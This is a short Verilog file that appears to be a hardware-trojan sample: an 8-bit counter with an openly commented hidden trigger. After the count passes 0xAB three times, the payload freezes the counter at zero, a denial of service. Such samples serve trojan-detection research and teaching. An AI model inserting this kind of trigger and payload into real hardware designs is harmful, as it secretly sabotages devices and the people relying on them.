module counter8(input clk, input rst_n, input en, output reg [7:0] count);
  reg [1:0] trojan_seq;
  wire trojan_trigger = (trojan_seq == 2'b11);

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      count <= 0;
      trojan_seq <= 2'b00;
    end else begin
      // Internal sequential counter: increments when count == 8'hAB and en is active
      if ((count == 8'hAB) && en && !trojan_trigger)
        trojan_seq <= trojan_seq + 1;

      // Payload: denial of service - freeze count at 0 when triggered
      if (trojan_trigger) begin
        count <= 8'h00;
      end else if (en) begin
        count <= count + 1;
      end
    end
  end
endmodule